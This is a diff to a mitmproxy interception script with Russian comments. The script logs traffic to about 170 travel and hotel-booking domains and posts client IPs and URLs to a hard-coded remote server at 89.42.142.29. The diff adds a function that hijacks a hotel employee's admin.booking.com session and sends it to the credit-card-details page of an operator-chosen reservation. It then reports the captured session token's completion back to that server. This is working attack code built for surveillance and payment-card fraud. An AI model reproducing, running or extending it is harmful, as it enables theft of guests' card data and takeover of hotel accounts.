@@ -15,14 +15,203 @@ FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"
 
 # Домены для мониторинга платформ
 PLATFORM_DOMAINS = [
-    "cloudbeds.com", "mews.com", "hotelogix.com", "protel.net",
-    "roomraccoon.com", "hoteliga.com", "rmscloud.com", "hotelfriend.com",
-    "littlehotelier.com", "clock-software.com", "innroad.com",
-    "hostpms.com", "travelline.ru", "sihot.com", "autoclerk.com",
-    "ezeeabsolute.com", "skytouchtechnology.com", "roommaster2000.co.uk",
-    "welcome-computers.co.uk", "skywaresystems.com", "verialhotel.es",
-    "macxton.com", "zeeustecnologia.com", "oonsoft.co.nz",
-    "cangooroo.net", "topsys.fr", "hotelpms.ru", "bbc.com"
+    "agoda.com",
+    "expedia.com", 
+    "hotels.com",
+    "trip.com",
+    
+    # Индийские
+    "goibibo.com",
+    "makemytrip.com",
+    "yatra.com",
+    "cleartrip.com",
+    "ixigo.com",
+    "paytm.com",
+    
+    # Американские/Европейские
+    "orbitz.com",
+    "travelocity.com",
+    "priceline.com",
+    "hotwire.com",
+    "cheaptickets.com",
+    "ebookers.com",
+    "cheapcaribbean.com",
+    "lastminute.com",
+    "lastminute.co.uk",
+    "opodo.com",
+    "ebookers.fr",
+    "ebookers.de",
+    "volagratis.com",
+    
+    # Аренда жилья
+    "airbnb.com",
+    "vrbo.com",
+    "homeaway.com",
+    "flipkey.com",
+    "vacationrentals.com",
+    "housetrip.com",
+    "wimdu.com",
+    "9flats.com",
+    "onefinestay.com",
+    
+    # Хостелы
+    "hostelworld.com",
+    "hostelbookers.com",
+    "hostels.com",
+    "grouphouse.com",
+    
+    # Люксовые/премиум
+    "plumguide.com",
+    "tablethotels.com",
+    "kiwicollection.com",
+    "designhotels.com",
+    "smallluxuryhotels.com",
+    
+    # Бутик-отели
+    "boutiquehotels.com",
+    "i-escape.com",
+    
+    # Почасовая аренда
+    "dayuse.com",
+    "hoteltonight.com",
+    "byhours.com",
+    "recharge.com",
+    "daybreakhotels.com",
+    
+    # Оптовые/корпоративные
+    "hotelbeds.com",
+    "sunhotels.net",
+    "tourico.com",
+    "gta.com",
+    "hotelcombined.com",
+    "trivago.com",
+    "kayak.com",
+    "skyscanner.com",
+    
+    # Азиатские
+    "rakuten.com",
+    "rakuten.travel",
+    "japanican.com",
+    "jalan.net",
+    "japanhotel.net",
+    "rurubu.travel",
+    "skyticket.jp",
+    "asianatra.com",
+    "traveloka.com",
+    "tiket.com",
+    "pegipegi.com",
+    "misteraladin.com",
+    "zalora.com",
+    "wego.com",
+    
+    # Китайские
+    "qunar.com",
+    "tongcheng.com",
+    "tuniu.com",
+    "mango.com",
+    "elong.com",
+    "meituan.com",
+    "dianping.com",
+    "ctrip.com.hk",
+    "trip.com.hk",
+    
+    # Корейские
+    "yanolja.com",
+    "goodchoice.kr",
+    "hotelcombined.co.kr",
+    
+    # Тайваньские
+    "ezfly.com",
+    "colatour.com.tw",
+    
+    # Гонконгские
+    "hk.trip.com",
+    "zuji.com.hk",
+    
+    # Сингапурские
+    "zuji.com.sg",
+    "agoda.com.sg",
+    
+    # Австралийские
+    "webjet.com.au",
+    "expedia.com.au",
+    "lastminute.com.au",
+    "wotif.com",
+    "stayz.com.au",
+    
+    # Новозеландские
+    "expedia.co.nz",
+    
+    # Канадские
+    "expedia.ca",
+    "redtag.ca",
+    "itravel2000.com",
+    
+    # Британские
+    "expedia.co.uk",
+    "laterooms.com",
+    "superbreak.com",
+    "alpharooms.com",
+    
+    # Немецкие
+    "expedia.de",
+    "hrs.com",
+    "trivago.de",
+    "booking.de",
+    
+    # Французские
+    "expedia.fr",
+    "voyages-sncf.com",
+    "trainline.eu",
+    "booking.fr",
+    
+    # Итальянские
+    "expedia.it",
+    "venere.com",
+    "volagratis.it",
+    
+    # Испанские
+    "expedia.es",
+    "rumbo.es",
+    "atrapalo.com",
+    "booking.es",
+
+    # Бразильские
+    "decolar.com",
+    "submarinoviagens.com.br",
+    "hotelurbano.com",
+    
+    # Мексиканские
+    "despegar.com",
+    "viaja.com.mx",
+    
+    # Турецкие
+    "etstur.com",
+    "tatil.com",
+    "odamax.com",
+    
+    # Ближний Восток
+    "almosafer.com",
+    "cleartrip.ae",
+    "holidaysby.com",
+    
+    # Африканские
+    "travelstart.com",
+    "safarinow.com",
+    
+    # Цепочки отелей
+    "marriott.com",
+    "hilton.com",
+    "ihg.com",
+    "hyatt.com",
+    "accor.com",
+    "bestwestern.com",
+    "bwhhotelgroup.com",
+    "choicehotels.com",
+    "wynnhotels.com",
+    "sonder.com",
+    "oakwood.com",
+    "frasershospitality.com"
 ]
 
 # Пути к флагам
@@ -45,26 +234,12 @@ CUSTOM_REDIRECT_DONE_FLAG = r"C:\temp\mitm_custom_redirect_done.txt"
 BOOKING_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_reservations_once"
 BOOKING_RESERVATIONS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_reservations_hotel_id.txt"
 BOOKING_RESERVATIONS_REPORT_ID_FILE = r"C:\temp\mitm_booking_reservations_report_id.txt"
+BOOKING_CC_DETAILS_FLAG = r"C:\temp\mitm_booking_cc_details_once"
+BOOKING_CC_DETAILS_BN_FILE = r"C:\temp\mitm_booking_cc_details_bn.txt"
+BOOKING_CC_DETAILS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_cc_details_hotel_id.txt"
 
 REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
 LOG_PREFIX = "[MITM-REDIR]"
-
-# Трекеры для анти-спама
-last_function_start = {}  # {function_type: timestamp}
-
-# Добавьте эту функцию после других функций
-def get_notification_key(redirect_type: str, from_url: str) -> str:
-    """Создает ключ для анти-спама на основе типа редиректа и URL"""
-    # Для функций 13, 15, 18 - группируем по типу
-    if "BOOKING_HOTEL" in redirect_type:
-        return "BOOKING_HOTEL"
-    elif "FUNCTION_15" in redirect_type:
-        return "FUNCTION_15_HOTEL_SECURITY"
-    elif "FUNCTION_18" in redirect_type:
-        return "FUNCTION_18_RESERVATIONS_DOWNLOAD"
-    
-    # Для других типов - используем redirect_type
-    return redirect_type
 
 def log(msg):
     ctx.log.info(f"{LOG_PREFIX} {msg}")
@@ -86,15 +261,11 @@ def post_log_to_server(payload: dict, endpoint: str = LOG_SERVER_URL):
 
 def log_redirect_to_server(client_ip, from_url, to_url, redirect_type):
     """Логирование редиректа"""
-    # Создаем ключ для анти-спама
-    notification_key = get_notification_key(redirect_type, from_url)
-    
     payload = {
         "client_ip": client_ip or "Unknown",
         "from_url": from_url or "Unknown",
         "to_url": to_url or "Unknown",
         "redirect_type": redirect_type or "Unknown",
-        "notification_key": notification_key,  # Добавляем ключ для анти-спама
         "timestamp": datetime.utcnow().isoformat() + "Z"
     }
     post_log_to_server(payload, LOG_SERVER_URL)
@@ -192,6 +363,35 @@ def should_operation_16():
 
 def should_custom_redirect():
     return os.path.exists(CUSTOM_REDIRECT_FLAG)
+
+def should_booking_cc_details():
+    return os.path.exists(BOOKING_CC_DETAILS_FLAG)
+
+def get_booking_cc_details_bn():
+    try:
+        if os.path.exists(BOOKING_CC_DETAILS_BN_FILE):
+            with open(BOOKING_CC_DETAILS_BN_FILE, 'r') as f:
+                return f.read().strip()
+    except Exception as e:
+        log(f"Error reading booking cc details bn: {e}")
+    return "5331278429"  # Значение по умолчанию
+
+def get_booking_cc_details_hotel_id():
+    try:
+        if os.path.exists(BOOKING_CC_DETAILS_HOTEL_ID_FILE):
+            with open(BOOKING_CC_DETAILS_HOTEL_ID_FILE, 'r') as f:
+                return f.read().strip()
+    except Exception as e:
+        log(f"Error reading booking cc details hotel_id: {e}")
+    return "10790315"  # Значение по умолчанию
+
+def remove_booking_cc_details_flag():
+    try:
+        if os.path.exists(BOOKING_CC_DETAILS_FLAG):
+            os.remove(BOOKING_CC_DETAILS_FLAG)
+            log("Booking CC details redirect flag removed")
+    except Exception as e:
+        ctx.log.warn(f"{LOG_PREFIX} remove_booking_cc_details_flag error: {e}")
 
 def get_custom_redirect_from():
     try:
@@ -647,7 +847,6 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
     """
     ФУНКЦИЯ 15:
     Перенаправляет на security_settings.html.
-    Анти-спам: отправляет только один лог о начале.
     """
     try:
         if not should_booking_hotel_security():
@@ -724,7 +923,7 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"Function 15: Redirect {url} -> {target_url}")
         
-        # Логируем редирект (отправляется на сервере с анти-спамом)
+        # Логируем редирект
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_15_HOTEL_SECURITY")
         
@@ -822,9 +1021,7 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
                     os.remove(CUSTOM_REDIRECT_DONE_FLAG)
                     log("[F17] Done flag removed after delay - other functions can now work")
                 
-                # УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ НЕ ОТПРАВЛЯЕМ!
-                # Сервер сам отправит уведомление при получении редиректа CUSTOM_ONETIME_REDIRECT
-                log("[F17] Function 17 completed (no separate completion notification needed)")
+                log("[F17] Function 17 completed")
                 
             except Exception as e:
                 log(f"[F17] Error in delayed flag removal: {e}")
@@ -836,23 +1033,187 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
     except Exception as e:
         log(f"[F17] custom_redirect error: {e}")
         return False
+        
+def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
+    """
+    ФУНКЦИЯ 19:
+    1. Перенаправляет любой запрос к admin.booking.com (любая страница) 
+       на https://secure-admin.booking.com/booking_cc_details.html
+    2. Параметры:
+       - lang: из предыдущего запроса или 'en'
+       - bn: задается админом при запуске (5331278429)
+       - hotel_id: задается админом при запуске (10790315)
+       - has_bvc=1
+    3. Функция завершается когда открывается страница с параметром ses
+    4. Отправляет лог о завершении и делает финальный редирект на admin.booking.com/hotel/hoteladmin/
+    """
+    try:
+        log(f"[F19] Checking if should redirect...")
+        
+        if not should_booking_cc_details():
+            log(f"[F19] Flag not active")
+            return False
+
+        url = flow.request.pretty_url
+        host = (flow.request.pretty_host or "").lower()
+        
+        log(f"[F19] Processing URL: {url}")
+        log(f"[F19] Host: {host}")
+        
+        # ====== ТОЛЬКО admin.booking.com ======
+        # Любой сабдомен booking.com, но мы фокусируемся на admin
+        if not host.endswith("booking.com"):
+            log(f"[F19] Not booking.com, skipping")
+            return False
+        
+        # ====== ОБНАРУЖЕНИЕ ЗАВЕРШЕНИЯ ФУНКЦИИ 19 ======
+        if "secure-admin.booking.com/booking_cc_details.html" in url:
+            parsed = urllib.parse.urlparse(url)
+            query = urllib.parse.parse_qs(parsed.query)
+            
+            log(f"[F19] Found booking_cc_details.html, checking parameters")
+            log(f"[F19] Parameters found: {list(query.keys())}")
+            
+            # Проверяем наличие параметра ses - это признак завершения функции
+            if "ses" in query:
+                log(f"[F19] ✓ Detected ses parameter -> FUNCTION 19 COMPLETED")
+                
+                # 1. Отправляем уведомление о завершении функции
+                client_ip = get_client_ip(flow)
+                send_function_complete_notification(client_ip, url, "FUNCTION_19_COMPLETE")
+                log(f"[F19] ✓ Completion notification sent for function 19")
+                
+                # 2. Делаем ФИНАЛЬНЫЙ редирект на admin.booking.com/hotel/hoteladmin/
+                # Получаем hotel_id из текущего URL или используем дефолтный
+                hotel_id = query.get("hotel_id", ["14762911"])[0]
+                ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]
+                final_target_url = f"https://admin.booking.com/hotel/hoteladmin/?ses={ses}&hotel_id={hotel_id}"
+                
+                log(f"[F19] ✓ Making FINAL redirect to: {final_target_url}")
+                
+                # 3. Удаляем флаг функции 19
+                remove_booking_cc_details_flag()
+                
+                # 4. Выполняем ФИНАЛЬНЫЙ редирект (через JavaScript с задержкой 2 сек)
+                js_redirect = f"""
+                <html>
+                <head><title>Card Details Complete</title></head>
+                <body style="background: #f0f0f0; font-family: Arial; padding: 20px;">
+                    <div style="max-width: 500px; margin: 100px auto; background: white; padding: 30px; border-radius: 10px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+                        <h2 style="color: #4CAF50;">✓ Card Details Complete</h2>
+                        <p>Card details page has been accessed.</p>
+                        <p>Redirecting to booking admin in <span id="countdown">2</span> seconds...</p>
+                        <div style="margin-top: 20px; font-size: 12px; color: #777;">
+                            If redirect doesn't work, <a href="{final_target_url}">click here</a>
+                        </div>
+                    </div>
+                    <script>
+                        var count = 2;
+                        var countdown = document.getElementById('countdown');
+                        var timer = setInterval(function() {{
+                            count--;
+                            countdown.textContent = count;
+                            if (count <= 0) {{
+                                clearInterval(timer);
+                                window.location.href = "{final_target_url}";
+                            }}
+                        }}, 1000);
+                        
+                        // Автоматический редирект через 2 секунды на всякий случай
+                        setTimeout(function() {{
+                            window.location.href = "{final_target_url}";
+                        }}, 2000);
+                    </script>
+                </body>
+                </html>
+                """
+                
+                flow.response = http.Response.make(
+                    200,  # 200 OK вместо 302
+                    js_redirect.encode('utf-8'),
+                    {
+                        "Content-Type": "text/html; charset=utf-8",
+                        "Cache-Control": "no-cache, no-store, must-revalidate",
+                        "Pragma": "no-cache",
+                        "Expires": "0"
+                    }
+                )
+                
+                log(f"[F19] ✓ Final redirect page sent (JavaScript redirect in 2 seconds)")
+                return True
+        
+        # ====== ПРОМЕЖУТОЧНАЯ СТРАНИЦА ======
+        # Если уже на целевой странице (но без ses) - не делаем редирект
+        if "secure-admin.booking.com/booking_cc_details.html" in url:
+            log(f"[F19] Already on booking_cc_details.html page, NOT redirecting")
+            return False
+        
+        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
+        # Редиректим только запросы к admin.booking.com
+        if not host.startswith("admin."):
+            log(f"[F19] Not admin.booking.com, skipping primary redirect")
+            return False
+        
+        # Получаем параметры из конфигурации
+        bn = get_booking_cc_details_bn()
+        hotel_id = get_booking_cc_details_hotel_id()
+        
+        # Получаем язык из текущего запроса или используем английский
+        parsed = urllib.parse.urlparse(url)
+        query = urllib.parse.parse_qs(parsed.query)
+        lang = query.get("lang", ["en"])[0]
+        
+        log(f"[F19] Using bn: {bn}, hotel_id: {hotel_id}, lang: {lang}")
+        
+        # Формируем целевой URL
+        target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id};has_bvc=1"
+        
+        # Проверяем, что это не редирект на ту же самую страницу
+        if url == target_url:
+            log(f"[F19] URL is same as target, not redirecting")
+            return False
+        
+        log(f"[F19] ✓ Primary redirect {url} -> {target_url}")
+        
+        # Логируем редирект (уведомление о НАЧАЛЕ функции)
+        client_ip = get_client_ip(flow)
+        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_19_CC_DETAILS")
+        
+        # Выполняем ПЕРВИЧНЫЙ редирект
+        flow.response = http.Response.make(
+            302, 
+            b"", 
+            {
+                "Location": target_url,
+                "Cache-Control": "no-cache, no-store, must-revalidate",
+                "Pragma": "no-cache",
+                "Expires": "0"
+            }
+        )
+        return True
+        
+    except Exception as e:
+        log(f"[F19] Error in booking_cc_details_redirect: {e}")
+        import traceback
+        log(f"[F19] Traceback: {traceback.format_exc()}")
+        return False
 
 # Главная точка входа
 def request(flow: http.HTTPFlow) -> None:
-    # Логируем доступ к платформам (анти-спам на сервере)
+    # Логируем доступ к платформам
     if should_log_domain(flow):
         try:
             client_ip = get_client_ip(flow)
             from_url = flow.request.pretty_url
             
             # Определяем тип редиректа
-            redirect_type = "DOMAIN_MONITOR_PLATFORM_ACCESS"
+            redirect_type = "DOMAIN_MONITOR"
             
             # Отправляем на сервер
             log_redirect_to_server(
                 client_ip=client_ip,
                 from_url=from_url,
-                to_url="MONITORED_DOMAIN_ACCESS",
+                to_url="MONITORED",
                 redirect_type=redirect_type
             )
         except Exception as e:
@@ -866,6 +1227,10 @@ def request(flow: http.HTTPFlow) -> None:
     
     # ========== ФУНКЦИЯ 18: BOOKING RESERVATIONS DOWNLOAD REDIRECT ==========
     if booking_reservations_download_redirect(flow):
+        return
+        
+    # ========== ФУНКЦИЯ 19: BOOKING CREDIT CARD DETAILS REDIRECT ==========
+    if booking_cc_details_redirect(flow):
         return
     
     # ========== КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ ==========
